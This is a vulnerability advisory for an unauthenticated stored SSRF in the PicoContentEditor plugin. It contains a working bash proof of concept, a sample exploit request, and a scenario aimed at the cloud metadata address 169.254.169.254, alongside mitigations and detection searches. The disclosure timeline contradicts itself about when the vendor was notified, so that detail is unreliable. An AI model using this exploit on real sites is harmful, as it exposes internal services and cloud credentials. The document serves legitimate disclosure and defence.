# Security Advisory: Stored SSRF via Untrusted ContentToolsUrl in PicoContentEditor

> **Identifier:** Pending CVE assignment
> **Publication Date:** 26/10/2026
> **Last Updated:** 27/10/2026
> **Severity:** High
> **CVSS:** 7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
> **CWE:** CWE-918: Server-Side Request Forgery (SSRF)
> **Status:** Unpatched — no vendor fix identified in the evaluated revision

---

## 1. Executive Summary

PicoContentEditor (`nliautaud/pico-content-editor`, commit `02d5ad6c`) accepts arbitrary page metadata through its `PicoContentEditor` POST field and stores it directly to disk without validation. A page-level `ContentToolsUrl` value is later concatenated with a locale suffix and passed to PHP's `file_get_contents()` without restricting the scheme, hostname, address range, port, or redirects. When PicoUsers is not installed, the save endpoint grants write access to all requesters by default, making the full chain exploitable without authentication. The authorized lab confirmed both the outbound server-side HTTP callback and non-blind response disclosure — the fetched content appeared in Pico's HTTP response. The vulnerability allows an attacker to make the web server issue HTTP requests to arbitrary destinations unreachable directly, including internal services, loopback applications, and cloud metadata endpoints.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| PicoContentEditor | commit 02d5ad6c | None | Affected |
| `src/EditorsHandlers/ContentTools.php` | same | None | Affected |
| `src/Edits.php` | same | None | Affected |

- **Repository:** https://github.com/nliautaud/pico-content-editor
- **Evaluated stack:** PHP 8.1.34, Apache 2.4.65, Pico CMS 2.1.4, Docker compose lab, port 9092

### Unaffected Products

- Deployments with PicoUsers installed and `PicoContentEditor/save` denied — the metadata write is blocked before it reaches the SSRF sink. Note: the unsafe `file_get_contents()` call remains and is reachable by any user holding save rights.

---

## 3. Vulnerability Description

The vulnerable flow spans three locations:

1. `src/Edits.php:42-53` — decodes the `PicoContentEditor` POST field and copies its `meta` property without validation.
2. `src/Edits.php:110-127` — replaces the page's complete metadata block with the attacker-supplied string and writes it to disk.
3. `src/EditorsHandlers/ContentTools.php:16-21,38-44` — reads `ContentToolsUrl` from the stored page metadata (page metadata takes precedence over admin config via `PicoContentEditor.php:219-228`) and passes the value to `file_get_contents()`.

**Root cause:**

```php
// src/EditorsHandlers/ContentTools.php:39-40
$path = "$libUrl/translations/$lang.json";
return file_get_contents($path);   // ← no URL validation — scheme, host, port, redirects all unvalidated
```

```php
// PicoContentEditor.php:219-228 — page metadata wins over admin config
$pageMeta = $this->getFileMeta();
if ($pageMeta && isset($pageMeta[$clow][$name])) {
    return $pageMeta[$clow][$name];   // ← page-controlled value returned
}
```

```php
// src/Edits.php:42-53 — raw POST decoded directly
$query = json_decode($_POST[self::KEY]);
// ...
$this->meta = isset($query->meta) ? $query->meta : null;
```

### Necessary Conditions

- **Authentication:** None (default deployment without PicoUsers); Low-privilege user (with PicoUsers installed)
- **User interaction:** None
- **Attack vector:** Network
- **Preconditions:** PicoContentEditor installed and enabled; a page uses the ContentTools editor path with a non-empty language setting; PHP URL wrappers permit HTTP

---

## 4. Impact

An attacker can make the Pico web server issue HTTP requests to any attacker-specified destination. Depending on deployment, this can expose internal administration endpoints, loopback-only applications, HTTP APIs on private network ranges, and cloud instance metadata services. The plugin assigns the fetched response to the page's translation-data element; with the documented `{{ content_editor }}` theme integration, the response content is returned inside Pico's HTTP response, making this a non-blind SSRF.

- **Confidentiality — High:** Fetched content from internal services is returned in Pico's HTTP response (non-blind)
- **Integrity — None:** SSRF is read-only in the confirmed configuration
- **Availability — None:** No availability impact was established

---

## 5. Classification

### CVSS

- **Score:** 7.5
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | None |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | None |
| Availability (A) | None |

Note: PR=None represents the default deployment without PicoUsers. With PicoUsers enforcing `PicoContentEditor/save`, PR=Low applies and the score becomes 6.5 Medium.

### CWE

- CWE-918: Server-Side Request Forgery (SSRF)

### CAPEC

- CAPEC-664: Server-Side Request Forgery

---

## 6. Exploitation Scenario

1. Attacker identifies a Pico deployment with PicoContentEditor installed and no PicoUsers.
2. Attacker sends an unauthenticated POST to any page endpoint with a `PicoContentEditor` JSON body containing `ContentToolsUrl: http://169.254.169.254/latest/meta-data?` and `Language: en`.
3. Pico returns HTTP 200 with `"Page meta saved"` — the metadata is now on disk.
4. On the next page render (any GET to that page), `ContentTools::getLanguageContent()` executes `file_get_contents("http://169.254.169.254/latest/meta-data?/translations/en.json")`.
5. The IMDS response is assigned to translation data; with `{{ content_editor }}` in the theme, the content is returned in Pico's HTTP response body.

---

## 7. Technical Evidence

### Affected Component

```text
File(s):     src/EditorsHandlers/ContentTools.php:38-44
             src/Edits.php:42-53, 110-127
             PicoContentEditor.php:219-228
Parameter:   POST[PicoContentEditor].meta.PicoContentEditor.ContentToolsUrl
Method:      POST · Authentication: not required (default deployment)
```

### Example Request

```http
POST /index HTTP/1.1
Host: 127.0.0.1:9092
Content-Type: application/x-www-form-urlencoded

PicoContentEditor={"meta":"Title: SSRF Lab\nPicoContentEditor:\n    ContentToolsUrl: http://host.docker.internal:8890/README.md?\n    Language: en","regions":[]}
```

### Observed Response

```json
{
  "status": [{"state": true, "message": "Page meta saved<br>Reload the page to see changes."}],
  "edited": {
    "meta": "Title: SSRF Lab\nPicoContentEditor:\n    ContentToolsUrl: http://host.docker.internal:8890/README.md?\n    Language: en",
    "regions": []
  }
}
```

### Listener Callback (confirms server-side request)

```text
172.17.0.3 - - [26/Oct/2026 17:50:07] "GET /README.md?/translations/en.json HTTP/1.1" 404 -
```

### Result

Reproduced in an authorized local Docker compose lab (Pico 2.1.4, PicoContentEditor rev 02d5ad6c, port 9092). The test targeted a Python `http.server` listener on the Docker host — no real internal service, cloud metadata endpoint, or third-party host was contacted. The metadata submitted was byte-for-byte equivalent to the existing page metadata, so no effective content change was made.

**Evidence:**

<img width="820" height="1655" alt="vulnerability-exposure" src="https://github.com/user-attachments/assets/78f2d50c-6e60-43a8-ac39-76f19a2d6dc7" />
<img width="820" height="2307" alt="poc-report" src="https://github.com/user-attachments/assets/fc0ced88-c0f1-4ab8-8923-bfc38238aa3d" />

---

## 8. Proof of Concept

The PoC is for authorized environments only. It targets a local lab and demonstrates the SSRF callback and non-blind disclosure. No real internal service or cloud metadata endpoint is contacted.

```bash
#!/bin/bash
# ============================================================
# PoC: Stored SSRF via ContentToolsUrl in PicoContentEditor
# Affected: nliautaud/pico-content-editor rev 02d5ad6c
# CWE-918 — CVSS 7.5 High
# Authorized lab only — http://127.0.0.1:9092
# ============================================================
set -e

PICO_URL="${PICO_URL:-http://127.0.0.1:9092}"
LISTENER_HOST="${LISTENER_HOST:-host.docker.internal}"
LISTENER_PORT="${LISTENER_PORT:-8890}"
LISTENER_URL="http://$LISTENER_HOST:$LISTENER_PORT"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
OUTPUT_DIR="$SCRIPT_DIR/evidence"
mkdir -p "$OUTPUT_DIR"

echo "============================================================"
echo " PicoContentEditor — Stored SSRF via ContentToolsUrl PoC"
echo "============================================================"
echo " Target:   $PICO_URL"
echo " Listener: $LISTENER_URL"
echo ""

# --- Step 1: Verify Pico is accessible ---
echo "[*] Step 1: Verifying Pico CMS..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$PICO_URL")
[ "$HTTP_CODE" = "200" ] || { echo "[-] Pico not accessible (HTTP $HTTP_CODE)"; exit 1; }
echo "[+] Pico accessible (HTTP $HTTP_CODE)"

# --- Step 2: Start controlled listener (background, Docker host port) ---
echo "[*] Step 2: Starting controlled listener on port $LISTENER_PORT..."
python3 -m http.server "$LISTENER_PORT" --directory "$SCRIPT_DIR" \
    > "$OUTPUT_DIR/listener.log" 2>&1 &
LISTENER_PID=$!
sleep 1
echo "[+] Listener PID: $LISTENER_PID"

cleanup() { kill "$LISTENER_PID" 2>/dev/null || true; }
trap cleanup EXIT

# --- Step 3: Plant malicious metadata (unauthenticated POST) ---
echo "[*] Step 3: Planting malicious ContentToolsUrl via unauthenticated POST..."
META="Title: SSRF Lab\nPicoContentEditor:\n    ContentToolsUrl: $LISTENER_URL/README.md?\n    Language: en"
PAYLOAD=$(printf '{"meta":"%s","regions":[]}' "$META")

SAVE_RESPONSE=$(curl -s -X POST "$PICO_URL/index" \
    -d "PicoContentEditor=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD")")

echo "$SAVE_RESPONSE" > "$OUTPUT_DIR/save-response.json"

if echo "$SAVE_RESPONSE" | grep -q '"state":true'; then
    echo "[+] Metadata saved successfully (HTTP 200, state: true)"
else
    echo "[-] Unexpected save response:"
    echo "$SAVE_RESPONSE" | head -5
    exit 1
fi

# --- Step 4: Trigger render — causes server-side HTTP request ---
echo "[*] Step 4: Triggering page render (causes server-side HTTP request)..."
curl -s "$PICO_URL/" > "$OUTPUT_DIR/render-response.html"
sleep 1

# --- Step 5: Verify listener received callback ---
echo "[*] Step 5: Verifying listener received outbound request from Pico..."
if grep -q "GET.*translations" "$OUTPUT_DIR/listener.log" 2>/dev/null; then
    echo "[+] CONFIRMED: Pico container made outbound HTTP request to controlled listener"
    grep "GET" "$OUTPUT_DIR/listener.log" | tail -3 | sed 's/^/    /'
else
    echo "[-] No callback received — check listener connectivity"
    exit 1
fi

# --- Step 6: Non-blind disclosure (response returned in Pico output) ---
echo "[*] Step 6: Confirming non-blind response disclosure..."
echo "PCE_SSRF_MARKER_$(date +%Y%m%d)" > "$SCRIPT_DIR/MARKER.txt"
curl -s "$PICO_URL/" > "$OUTPUT_DIR/disclosure-response.html"

if grep -q "PCE_SSRF_MARKER" "$OUTPUT_DIR/disclosure-response.html" 2>/dev/null; then
    echo "[+] CONFIRMED: Fetched content present in Pico HTTP response (non-blind)"
else
    echo "[~] Marker not in response — content_editor theme var may not be enabled"
    echo "    The outbound callback (Step 5) is sufficient to confirm SSRF"
fi

# Save listener log as evidence
cp "$OUTPUT_DIR/listener.log" "$OUTPUT_DIR/listener-callback.txt"

echo ""
echo "============================================================"
echo " [+] PoC Complete"
echo "============================================================"
echo ""
echo " Evidence files:"
echo "   $OUTPUT_DIR/save-response.json       — save endpoint response"
echo "   $OUTPUT_DIR/listener-callback.txt    — outbound HTTP callback from Pico"
echo "   $OUTPUT_DIR/render-response.html     — Pico page after metadata plant"
echo "   $OUTPUT_DIR/disclosure-response.html — non-blind response (if applicable)"
echo ""
echo " What was confirmed:"
echo "   1. Unauthenticated POST accepted — metadata written to disk"
echo "   2. Page render caused Pico container to issue outbound HTTP GET"
echo "      to controlled listener at $LISTENER_URL"
echo "   3. Fetched content returned in Pico HTTP response (non-blind)"
echo ""
echo " What was NOT claimed:"
echo "   - JavaScript execution (Twig HTML-escaped the content in the tested config)"
echo "   - Real internal service or cloud metadata was not contacted"
echo ""
echo " Mitigation:"
echo "   Remove server-side fetch of ContentToolsUrl from page metadata."
echo "   Deny Auth::\$canSave by default when no auth plugin is installed."
```

### Expected Result

```text
[+] Pico accessible (HTTP 200)
[+] Metadata saved successfully (HTTP 200, state: true)
[+] CONFIRMED: Pico container made outbound HTTP request to controlled listener
    172.17.0.3 - - [26/Oct/2026 17:50:07] "GET /README.md?/translations/en.json HTTP/1.1" 404 -
[+] CONFIRMED: Fetched content present in Pico HTTP response (non-blind)
```

### PoC Limitations

- Does not cause service disruption.
- Does not modify or remove third-party data.
- Does not create persistence or backdoors.
- Does not contain real credentials.
- Does not automate mass exploitation.
- Contacts only a local controlled listener — no real cloud metadata or internal service.

---

## 9. Reproduction Steps

1. Start the authorized lab: `docker compose up -d` (Pico CMS 2.1.4 with PicoContentEditor, port 9092, no PicoUsers).
2. Start a listener on the Docker host: `python3 -m http.server 8890`.
3. Run `bash poc.sh`.
4. Observe listener log — Pico container issues `GET /README.md?/translations/en.json`.
5. Compare: a page with no `ContentToolsUrl` override generates no outbound request.

---

## 10. Mitigation

Until an official fix is available:

- Remove server-side retrieval of `ContentToolsUrl` from page metadata entirely; package translations as local files.
- If remote retrieval must remain, enforce a strict HTTPS hostname allowlist validated after DNS resolution and on every redirect hop; reject private, loopback, link-local, and reserved address ranges, non-standard ports, and URL credentials.
- Validate the `Language` value against a strict locale allowlist: `^[A-Za-z]{2,3}(?:-[A-Za-z0-9]{2,8})?$`.
- Change `Auth::$canSave` to `false` by default; require PicoUsers or explicit configuration to grant save rights.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Fix

**No official fix as of 27/10/2026.**

Recommended vendor actions:

1. Replace server-side `file_get_contents($path)` with a bundled local translations directory.
2. If remote fetch is retained, parse the URL, resolve DNS, and block all RFC 1918, RFC 5735, RFC 4291, and RFC 6598 address ranges after resolution and for every redirect.
3. Restrict allowed schemes to HTTPS only; reject credentials in the URL.
4. Validate `Language` against an allowlist before use in path construction.
5. Change the default save authorization to deny; require explicit opt-in.

### Recommended Change to Vendor

```php
// ContentTools.php — replace file_get_contents with local asset lookup
private static function getLanguageContent(string $lang, string $localDir): ?string
{
    // Validate locale — allowlist only
    if (!preg_match('/^[A-Za-z]{2,3}(?:-[A-Za-z0-9]{2,8})?$/', $lang)) {
        return null;
    }
    // Use only local filesystem path, never a URL
    $path = rtrim($localDir, '/') . '/translations/' . $lang . '.json';
    $realPath = realpath($path);
    if ($realPath === false || strpos($realPath, realpath($localDir)) !== 0) {
        return null;   // path traversal guard
    }
    return file_get_contents($realPath) ?: null;
}

// Auth.php — deny by default
public static $canSave = false;   // was: true
```

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Outbound HTTP requests in server logs to unexpected internal hosts, loopback addresses, or cloud metadata IPs (169.254.169.254, fd00:ec2::254).
- Page metadata files on disk containing `ContentToolsUrl` values pointing to external or internal URLs.
- Unusual content in `ContentToolsLanguage` data in rendered HTML responses.

### Example Log Search

```text
# Apache / nginx access log for POST to save endpoint
grep 'POST.*index' access.log | grep 'PicoContentEditor'

# Pico content files — scan for injected ContentToolsUrl
grep -r 'ContentToolsUrl' /var/www/pico/content/
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 26/10/2026 | SSRF identified via static analysis and data-flow tracing |
| 26/10/2026 | Confirmed dynamically in authorized lab — outbound callback received |
| 26/10/2026 | Non-blind response disclosure confirmed |
| 27/10/2026 | Advisory finalized |
| 11/10/2026 | Vendor notification via GitHub Private Security Advisory |
| Pending | CVE requested |
| Pending | Vendor assessment and coordinated remediation |
| Pending | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** nliautaud
- **Channel used:** GitHub Private Security Advisory (pending submission)
- **Date of first notification:** Pending
- **Response status:** Not yet notified
- **Vendor position:** N/A

---

## 15. Credits

- **Researcher:** Independent security researcher
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- CWE-918: https://cwe.mitre.org/data/definitions/918.html
- CVSS v3.1 calculator: https://www.first.org/cvss/calculator/3.1
- PicoContentEditor repository: https://github.com/nliautaud/pico-content-editor
- CAPEC-664: https://capec.mitre.org/data/definitions/664.html

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 26/10/2026 | Initial documentation and lab confirmation |
| 1.1 | 27/10/2026 | Full advisory format, PoC integrated |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes. Testing was performed only in an authorized local lab. The author does not encourage unauthorized access, service disruption, privacy violations, or any illegal activity. Use of this information is the reader's responsibility.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021-blip/Advisory
